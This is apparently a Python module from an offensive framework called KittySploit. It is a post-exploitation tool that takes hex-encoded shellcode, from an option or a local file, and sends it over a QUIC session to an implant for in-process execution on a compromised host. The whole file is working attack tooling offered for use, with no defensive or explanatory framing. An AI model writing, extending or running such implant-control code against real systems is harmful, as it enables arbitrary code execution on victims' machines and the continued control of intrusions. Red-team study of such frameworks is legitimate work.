#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import re

from kittysploit import *
from core.framework.failure import FailureType, ProcedureError
from lib.protocols.quic.quic_session_mixin import QuicSessionMixin

_HEX_RE = re.compile(r"^[0-9a-fA-F]+$")


class Module(Post, QuicSessionMixin):
    """Execute raw shellcode on a QUIC implant session."""

    __info__ = {
        "name": "QUIC Execute Shellcode",
        "description": "Send hex-encoded shellcode to the implant for in-process execution",
        "author": "KittySploit Team",
        "session_type": SessionType.QUIC,
    }

    shellcode = OptString("", "Hex-encoded shellcode bytes", True)
    shellcode_file = OptFile("", "Read shellcode from a local binary file instead", False)

    def check(self):
        if not self._session_is_quic():
            print_error("This module requires an active QUIC session")
            return False
        payload = self._resolve_shellcode()
        if not payload:
            print_error("Provide shellcode hex or shellcode_file")
            return False
        if not _HEX_RE.fullmatch(payload):
            print_error("Shellcode must be hex-encoded")
            return False
        try:
            self.open_quic()
            return True
        except ProcedureError as exc:
            print_error(str(exc))
            return False

    def _resolve_shellcode(self) -> str:
        if self.shellcode_file and os.path.isfile(str(self.shellcode_file)):
            with open(self.shellcode_file, "rb") as handle:
                return handle.read().hex()
        return str(self.shellcode or "").strip()

    def run(self):
        payload = self._resolve_shellcode()
        if not payload or not _HEX_RE.fullmatch(payload):
            raise ProcedureError(FailureType.Unknown, "Invalid shellcode payload")

        print_status(f"Sending {len(payload) // 2} bytes of shellcode")
        client = self.open_quic()
        result = client.exec_shellcode(payload)
        print_success(result or "Shellcode dispatched")
        return True
